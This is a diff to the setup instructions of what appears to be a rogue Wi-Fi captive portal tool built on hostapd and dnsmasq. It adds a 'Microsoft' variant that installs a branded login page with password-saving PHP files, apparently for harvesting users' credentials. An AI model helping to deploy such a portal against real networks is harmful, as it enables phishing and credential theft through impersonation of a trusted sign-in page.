@@ -88,10 +88,19 @@ sudo systemctl restart apache2
 sudo mkdir -p /var/www/captive
 ```
 
-### 6) Create Web Captive Portal:
+### 6.A) Create Web Captive Portal (Default):
 ```bash
 sudo mv index.html /var/www/captive/
 sudo mv save.php /var/www/captive/
+```
+
+### 6.B) Create Web Captive Portal (Microsoft):
+```bash
+sudo mv Microsoft/index.html /var/www/captive/
+sudo mv Microsoft/save.php /var/www/captive/
+sudo mv Microsoft/password.php /var/www/captive/
+sudo mv Microsoft/save2.php /var/www/captive/
+sudo mv Microsoft/microsoft.svg /var/www/captive/
 ```
 
 ### 7) Create log file:
@@ -195,6 +204,7 @@ sudo dnsmasq -C dnsmasq.conf
 sudo hostapd hostapd.conf
 ```
 
+### Kill the process:
 ```bash
 sudo pkill dnsmasq
 sudo dnsmasq -C /full/path/to/dnsmasq.conf
